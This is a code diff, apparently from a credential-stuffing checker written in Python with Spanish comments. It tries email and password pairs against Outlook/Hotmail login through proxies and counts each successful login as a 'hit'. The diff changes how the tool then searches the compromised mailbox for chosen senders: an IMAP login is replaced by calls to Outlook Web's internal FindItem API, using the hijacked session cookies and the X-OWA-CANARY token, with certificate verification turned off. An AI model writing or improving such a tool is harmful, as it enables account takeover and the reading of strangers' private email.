@@ -78,62 +78,90 @@ def get_target_senders_from_db():
     except:
         return []
 
-def search_inbox_imap(email_addr, password, target_senders):
+def search_inbox_owa(session, email_addr, target_senders):
     """
-    Usa IMAP con las credenciales ya verificadas para buscar en el buzón.
-    Busca específicamente cuántos correos hay de cada target_sender.
+    Usa la API interna SOAP-lite de Outlook Web (service.svc) con la sesión de cookies.
     """
     senders_found = {}
     subject_count = 0
+    
     try:
-        print(f"[DEBUG IMAP {email_addr}] Conectando a imap-mail.outlook.com...")
-        mail = imaplib.IMAP4_SSL('imap-mail.outlook.com', 993)
-        mail.login(email_addr, password)
-        mail.select('INBOX')
-        print(f"[DEBUG IMAP {email_addr}] Login exitoso. Buscando remitentes objetivo...")
+        print(f"[DEBUG OWA {email_addr}] Puenteando SSO a outlook.live.com...")
+        owa_res = session.get("https://outlook.live.com/mail/0/inbox", verify=False, timeout=15, allow_redirects=True)
+        
+        # Enviar formulario oculto si existe para completar el login SSO
+        if "<form" in owa_res.text and "login" in owa_res.url.lower():
+            form_action = re.search(r'action="([^"]+)"', owa_res.text, re.IGNORECASE)
+            if form_action:
+                bridge_url = form_action.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
+                inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', owa_res.text, re.IGNORECASE)
+                bridge_data = {k: v for k, v in inputs}
+                session.post(bridge_url, data=bridge_data, verify=False, timeout=15, allow_redirects=True)
+                
+        # Extraer el canary header de las cookies
+        owa_canary = session.cookies.get("X-OWA-CANARY") or ""
+        if not owa_canary:
+            print(f"[DEBUG OWA {email_addr}] No se pudo obtener X-OWA-CANARY. OWA Search fallará.")
+            return senders_found, subject_count
+            
+        search_headers = {
+            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0"),
+            "Accept": "application/json",
+            "X-OWA-CANARY": owa_canary,
+            "Action": "FindItem",
+            "X-OWA-ActionName": "FindMailItem",
+            "X-Requested-With": "XMLHttpRequest"
+        }
+        
+        search_url = "https://outlook.live.com/owa/service.svc?action=FindItem&app=Mail"
         
         if not target_senders:
-            print(f"[DEBUG IMAP {email_addr}] No hay target_senders definidos. Obteniendo últimos 10.")
-            _, data = mail.search(None, 'ALL')
-            msg_ids = data[0].split() if data[0] else []
-            for msg_id in msg_ids[-10:]:
-                try:
-                    _, msg_data = mail.fetch(msg_id, '(BODY.PEEK[HEADER.FIELDS (FROM)])')
-                    raw = msg_data[0][1].decode('utf-8', errors='replace')
-                    m = re.search(r'[\w\.\+\-]+@[\w\.\-]+\.[a-zA-Z]{2,}', raw)
-                    if m:
-                        sender = m.group(0).lower()
-                        senders_found[sender] = senders_found.get(sender, 0) + 1
-                except:
-                    pass
-            subject_count = len(msg_ids[-10:])
+            print(f"[DEBUG OWA {email_addr}] Buscando 10 mensajes generales (sin target)...")
+            q = ""
+            payload = {"__type":"FindItemJsonRequest:#Exchange","Header":{"__type":"JsonRequestHeaders:#Exchange","RequestServerVersion":"V2018_01_08","TimeZoneContext":{"__type":"TimeZoneContext:#Exchange","TimeZoneDefinition":{"__type":"TimeZoneDefinitionType:#Exchange","Id":"UTC"}}},"Body":{"__type":"FindItemJsonRequestMessage:#Exchange","ItemShape":{"__type":"ItemResponseShape:#Exchange","BaseShape":"IdOnly","AdditionalProperties":[{"__type":"PropertyUri:#Exchange","FieldURI":"message:From"}]},"ParentFolderIds":[{"__type":"DistinguishedFolderId:#Exchange","Id":"inbox"}],"Traversal":"Shallow","QueryString":q,"Paging":{"__type":"IndexedPageView:#Exchange","BasePoint":"Beginning","Offset":0,"MaxEntriesReturned":10},"ShapeName":"MailListItem"}}
+            gr = session.post(search_url, json=payload, headers=search_headers, verify=False, timeout=15)
+            if gr.status_code == 200:
+                gd2 = gr.json()
+                msgs = gd2.get("Body", {}).get("ResponseMessages", {}).get("Items", [])
+                for m_wrap in msgs:
+                    items = m_wrap.get("RootFolder", {}).get("Items", [])
+                    for item in items:
+                        s = item.get("From", {}).get("Mailbox", {}).get("EmailAddress", "")
+                        if s: 
+                            sender = s.lower()
+                            senders_found[sender] = senders_found.get(sender, 0) + 1
+                            subject_count += 1
         else:
-            # Buscar cada target_sender específicamente
             for ts in target_senders:
+                clean_ts = ts.strip().lower()
+                if not clean_ts: continue
+                
+                print(f"[DEBUG OWA {email_addr}] Buscando target: {clean_ts} ...")
+                payload = {"__type":"FindItemJsonRequest:#Exchange","Header":{"__type":"JsonRequestHeaders:#Exchange","RequestServerVersion":"V2018_01_08","TimeZoneContext":{"__type":"TimeZoneContext:#Exchange","TimeZoneDefinition":{"__type":"TimeZoneDefinitionType:#Exchange","Id":"UTC"}}},"Body":{"__type":"FindItemJsonRequestMessage:#Exchange","ItemShape":{"__type":"ItemResponseShape:#Exchange","BaseShape":"IdOnly","AdditionalProperties":[{"__type":"PropertyUri:#Exchange","FieldURI":"message:From"}]},"ParentFolderIds":[{"__type":"DistinguishedFolderId:#Exchange","Id":"inbox"}],"Traversal":"Shallow","QueryString":clean_ts,"Paging":{"__type":"IndexedPageView:#Exchange","BasePoint":"Beginning","Offset":0,"MaxEntriesReturned":15},"ShapeName":"MailListItem"}}
+                
                 try:
-                    clean_ts = ts.strip().lower()
-                    if not clean_ts: continue
-                    # Buscar mensajes FROM este remitente
-                    _, data = mail.search(None, 'FROM', f'"{clean_ts}"')
-                    msg_ids = data[0].split() if data[0] else []
-                    count = len(msg_ids)
-                    if count > 0:
-                        senders_found[clean_ts] = count
-                        subject_count += count
-                        print(f"[DEBUG IMAP {email_addr}] Encontrado {count} de {clean_ts}")
+                    gr = session.post(search_url, json=payload, headers=search_headers, verify=False, timeout=15)
+                    if gr.status_code == 200:
+                        gd2 = gr.json()
+                        msgs = gd2.get("Body", {}).get("ResponseMessages", {}).get("Items", [])
+                        count = 0
+                        for m_wrap in msgs:
+                            items = m_wrap.get("RootFolder", {}).get("Items", [])
+                            count += len(items)
+                        
+                        if count > 0:
+                            senders_found[clean_ts] = count
+                            subject_count += count
+                            print(f"[DEBUG OWA {email_addr}] Encontrados {count} de {clean_ts}")
                 except Exception as e:
-                    print(f"[DEBUG IMAP {email_addr}] Error buscando {ts}: {e}")
+                    print(f"[DEBUG OWA {email_addr}] Falló búsqueda {ts}: {e}")
                     
-        mail.logout()
-        # Tomar los top 15
-        top_senders = dict(sorted(senders_found.items(), key=lambda item: item[1], reverse=True)[:15])
-        senders_found = top_senders
-        print(f"[DEBUG IMAP {email_addr}] Búsqueda terminada. Encontrados: {senders_found}")
+        # Ordenar top
+        senders_found = dict(sorted(senders_found.items(), key=lambda item: item[1], reverse=True)[:15])
+        print(f"[DEBUG OWA {email_addr}] Senders finales: {senders_found}")
         
-    except imaplib.IMAP4.error as e:
-        print(f"[DEBUG IMAP {email_addr}] Error de credenciales o IMAP deshabilitado: {e}")
     except Exception as e:
-        print(f"[DEBUG IMAP {email_addr}] Error general IMAP: {e}")
+        print(f"[DEBUG OWA {email_addr}] Error general OWA Web: {e}")
         
     return senders_found, subject_count
 
@@ -362,10 +390,9 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
         if "kmsi" in res2.url.lower() or "kmsi" in res2.text.lower() or "oauth2" in res2.url.lower():
             # ¡HITS POSITIVO!
             
-            # --- BÚSQUEDA REAL EN BUZÓN VÍA IMAP ---
-            # Usamos las credenciales (email+pass) ya verificadas con IMAP Basic Auth
-            # Outlook.com/Hotmail.com soporta esto para cuentas consumer
-            senders_found, subject_count = search_inbox_imap(email, password, target_senders)
+            # --- BÚSQUEDA REAL EN BUZÓN VÍA OWA API (SOAP-lite) ---
+            # Usamos la sesión web internamente puenteada para buscar los correos
+            senders_found, subject_count = search_inbox_owa(session, email, target_senders)
             
             owa_canary = session.cookies.get("X-OWA-CANARY") or ""
             api_headers["X-OWA-CANARY"] = owa_canary
